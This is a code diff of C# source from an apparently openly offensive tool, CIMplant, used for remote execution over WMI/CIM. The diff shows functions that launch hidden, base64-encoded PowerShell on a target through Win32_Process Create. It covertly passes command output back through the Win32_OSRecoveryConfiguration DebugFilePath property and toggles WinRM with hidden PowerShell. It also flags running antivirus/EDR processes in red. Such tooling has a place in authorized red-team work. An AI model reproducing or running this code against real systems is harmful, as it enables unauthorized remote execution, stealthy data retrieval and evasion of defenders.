+                                    //Console.WriteLine("Waiting for pipeline to finish...");
+                                    Thread.Sleep(5000);
+
+                                    // Check on our timeout here
+                                    TimeSpan elasped = DateTime.Now.Subtract(startTime);
+                                    if (elasped > timeout)
+                                        break;
+                                }
+
+                                //powershell.EndInvoke(asyncPs);
                             }
-
-                            //powershell.EndInvoke(asyncPs);
+                            else
+                            {
+                                powershell.Invoke();
+                            }
                         }
                         else
-                        {
-                            powershell.Invoke();
-                        }
+                            wsman = false;
                     }
-                    else
-                        wsman = false;
-                }
-            }
-
-            GetOut:
-            if (wsman == false)
-            {
-                if (string.IsNullOrEmpty(planter.System?.ToString()))
-                {
-                    try
-                    {
-                        ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command)
-                        {
-                            RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
-                        };
-
-                        Process proc = new Process {StartInfo = procStartInfo};
-                        proc.Start();
-
-                        // Get the output into a string
-                        string result = proc.StandardOutput.ReadToEnd();
-                        // Display the command output.
-                        Console.WriteLine(result);
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine(e);
-                    }
-
-                    return true;
                 }
 
-
-                // Create the parameters and create the new process. Broken out to make it easier to follow what's up
-                string encodedCommand = "$data = (" + command +
-                                        " | Out-String).Trim(); $encdata = [Int[]][Char[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
-                var encodedCommandB64 =
-                    Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
-                string fullCommand = "powershell -enc " + encodedCommandB64;
-
-                CimMethodParametersCollection cimParams = new CimMethodParametersCollection
+                GetOut:
+                if (wsman == false)
                 {
-                    CimMethodParameter.Create("CommandLine", fullCommand, CimFlags.In)
-                };
-
-                if (noDebugCheck)
-                {
-                    // operation options for timeout
-                    CimOperationOptions operationOptions = new CimOperationOptions
+                    if (string.IsNullOrEmpty(planter.System?.ToString()))
                     {
-                        Timeout = TimeSpan.FromMilliseconds(10000),
+                        try
+                        {
+                            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command)
+                            {
+                                RedirectStandardOutput = true,
+                                UseShellExecute = false,
+                                CreateNoWindow = true
+                            };
+
+                            Process proc = new Process { StartInfo = procStartInfo };
+                            proc.Start();
+
+                            // Get the output into a string
+                            string result = proc.StandardOutput.ReadToEnd();
+                            // Display the command output.
+                            Console.WriteLine(result);
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine(e);
+                        }
+
+                        return true;
+                    }
+
+
+                    // Create the parameters and create the new process. Broken out to make it easier to follow what's up
+                    string encodedCommand = "$data = (" + command +
+                                            " | Out-String).Trim(); $encdata = [Int[]][Char[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
+                    var encodedCommandB64 =
+                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
+                    string fullCommand = "powershell -enc " + encodedCommandB64;
+
+                    CimMethodParametersCollection cimParams = new CimMethodParametersCollection
+                    {
+                        CimMethodParameter.Create("CommandLine", fullCommand, CimFlags.In)
                     };
 
-                    // Let's create a new instance
-                    CimInstance cimInstance = new CimInstance("Win32_Process");
-                    cimSession.InvokeMethod(Namespace, cimInstance, "Create", cimParams, operationOptions);
-                    Thread.Sleep(20000);
+                    if (noDebugCheck)
+                    {
+                        // operation options for timeout
+                        CimOperationOptions operationOptions = new CimOperationOptions
+                        {
+                            Timeout = TimeSpan.FromMilliseconds(10000),
+                        };
+
+                        // Let's create a new instance
+                        CimInstance cimInstance = new CimInstance("Win32_Process");
+                        cimSession.InvokeMethod(Namespace, cimInstance, "Create", cimParams, operationOptions);
+                        Thread.Sleep(20000);
+                    }
+
+                    else
+                        cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
                 }
 
-                else
-                    cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
-            }
-
-            // Give it a second to write
-            Thread.Sleep(1000);
+                // Give it a second to write
+                Thread.Sleep(1000);
 
 
-            // Give it a second to write and check for changes to DebugFilePath
-            Thread.Sleep(1000);
+                // Give it a second to write and check for changes to DebugFilePath
+                Thread.Sleep(1000);
 
-            if (!noDebugCheck)
-            {
-                CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);
-
-                //Get the contents of the file in the DebugFilePath prop
-                string[] commandOutput = GetOsRecovery(cimSession).Split(',');
-                StringBuilder output = new StringBuilder();
-
-                //Print output.
-                foreach (string integer in commandOutput)
+                if (!noDebugCheck)
                 {
-                    try
+                    CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);
+
+                    //Get the contents of the file in the DebugFilePath prop
+                    string[] commandOutput = GetOsRecovery(cimSession).Split(',');
+                    StringBuilder output = new StringBuilder();
+
+                    //Print output.
+                    foreach (string integer in commandOutput)
                     {
-                        char a = (char) Convert.ToInt32(integer);
-                        output.Append(a);
+                        try
+                        {
+                            char a = (char)Convert.ToInt32(integer);
+                            output.Append(a);
+                        }
+                        catch
+                        {
+                            //pass
+                        }
                     }
-                    catch
-                    {
-                        //pass
-                    }
+
+                    Console.WriteLine(output);
                 }
+                else
+                    Console.WriteLine("New process spawned, not checking for output");
 
-                Console.WriteLine(output);
+                SetOsRecovery(cimSession, originalWmiProperty);
+
             }
-            else
-                Console.WriteLine("New process spawned, not checking for output");
 
-            SetOsRecovery(cimSession, originalWmiProperty);
+            else
+            {
+                Console.WriteLine("Shhh...Not using PS");
+
+                // Create the parameters and create the new process.
+                CimMethodParametersCollection cimParams = new CimMethodParametersCollection
+                    {
+                        CimMethodParameter.Create("CommandLine", planter.Commander.Execute, CimFlags.In)
+                    };
+
+                CimMethodResult results = cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
+
+                Console.WriteLine(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
+                ? "Successfully created process"
+                : "Issues creating process");
+            }
 
             return true;
         }
@@ -1006,50 +1329,64 @@ namespace CIMplant
         {
             CimSession cimSession = planter.Connector.ConnectedCimSession;
 
-            // Create the parameters and create the new process.
-            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
+            if (!planter.Commander.NoPS)
             {
-                CimMethodParameter.Create("CommandLine", "powershell -w hidden -command \"Disable-PSRemoting -Force\"",
-                    CimFlags.In)
-            };
+                // Create the parameters and create the new process.
+                CimMethodParametersCollection cimParams = new CimMethodParametersCollection
+                {
+                    CimMethodParameter.Create("CommandLine", "powershell -w hidden -command \"Disable-PSRemoting -Force\"",
+                        CimFlags.In)
+                };
 
-            // We only need the first instance
-            CimMethodResult results =
-                cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
+                // We only need the first instance
+                CimMethodResult results =
+                    cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
 
-            // Give it a second to write
-            Thread.Sleep(1000);
+                // Give it a second to write
+                Thread.Sleep(1000);
 
-            Console.WriteLine(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
-                ? "Successfully disabled WinRM"
-                : "Issues disabling WinRM");
-
-            return true;
+                Console.WriteLine(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
+                    ? "Successfully disabled WinRM"
+                    : "Issues disabling WinRM");
+                return true;
+            }
+            else
+            {
+                Messenger.WarningMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
+                return null;
+            }
         }
 
         public object enable_winrm(Planter planter)
         {
             CimSession cimSession = planter.Connector.ConnectedCimSession;
 
-            // Create the parameters and create the new process.
-            CimMethodParametersCollection cimParams = new CimMethodParametersCollection
+            if (!planter.Commander.NoPS)
             {
-                CimMethodParameter.Create("CommandLine", "powershell -w hidden -command \"Enable-PSRemoting -Force\"",
-                    CimFlags.In)
-            };
+                // Create the parameters and create the new process.
+                CimMethodParametersCollection cimParams = new CimMethodParametersCollection
+                {
+                    CimMethodParameter.Create("CommandLine", "powershell -w hidden -command \"Enable-PSRemoting -Force\"",
+                        CimFlags.In)
+                };
 
-            // We only need the first instance
-            CimMethodResult results =
-                cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
+                // We only need the first instance
+                CimMethodResult results =
+                    cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
 
-            // Give it a second to write
-            Thread.Sleep(1000);
+                // Give it a second to write
+                Thread.Sleep(1000);
 
-            Console.WriteLine(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
-                ? "Successfully enabled WinRM"
-                : "Issues enabled WinRM");
-
-            return true;
+                Console.WriteLine(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
+                    ? "Successfully enabled WinRM"
+                    : "Issues enabled WinRM");
+                return true;
+            }
+            else
+            {
+                Messenger.WarningMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
+                return null;
+            }
         }
 
         public object registry_mod(Planter planter)
@@ -1655,23 +1992,48 @@ namespace CIMplant
             const string query = "SELECT * FROM Win32_Process";
             IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", query);
 
-            Console.WriteLine("{0,-35}{1,15}", "Name", "Handle");
-            Console.WriteLine("{0,-35}{1,15}", "-----------", "---------");
+            Console.WriteLine("{0,-50}{1,15}", "Name", "Handle");
+            Console.WriteLine("{0,-50}{1,15}", "-----------", "---------");
 
             foreach (CimInstance cimObject in queryInstance)
             {
                 string name = cimObject.CimInstanceProperties["Name"].Value.ToString();
-                if (name.Length > 30)
-                    name = Truncate(name, 30) + "...";
+                if (name.Length > 45)
+                    name = Truncate(name, 45) + "...";
                 try
                 {
-                    Console.WriteLine("{0,-35}{1,15}", name, cimObject.CimInstanceProperties["Handle"].Value);
+                    if (Messenger.AVs.Any(name.ToLower().Equals))
+                    {
+                        // Make AV/EDR pop
+                        if (Console.BackgroundColor == ConsoleColor.Black)
+                        {
+                            Console.ForegroundColor = ConsoleColor.Red;
+                            Console.WriteLine("{0,-50}{1,15}", name, cimObject.CimInstanceProperties["Handle"].Value);
+                            Console.ResetColor();
+                        }
+                    }
+                    else if (Messenger.Admin.Any(name.ToLower().Equals))
+                    {
+                        // Make AV/EDR pop
+                        if (Console.BackgroundColor == ConsoleColor.Black)
+                        {
+                            Console.ForegroundColor = ConsoleColor.Cyan;
+                            Console.WriteLine("{0,-35}{1,15}", name, cimObject.CimInstanceProperties["Handle"].Value);
+                            Console.ResetColor();
+                        }
+                    }
+                    else
+                        Console.WriteLine("{0,-35}{1,15}", name, cimObject.CimInstanceProperties["Handle"].Value);
+
                 }
                 catch
                 {
                     //value probably doesn't exist, so just pass
                 }
             }
+
+            Messenger.BlueMessage("\nDenotes a potential admin tool");
+            Messenger.ErrorMessage("Denotes a potential AV/EDR product");
             return queryInstance;
         }
 
@@ -2032,11 +2394,6 @@ namespace CIMplant
             
             return Convert.ToInt32(queryInstance.First().CimInstanceProperties["FileSize"].Value);
         }
-
-
-
-
-
 
         public string CheckForFinishedDebugFilePath(string originalWmiProperty, CimSession cimSession)
         {
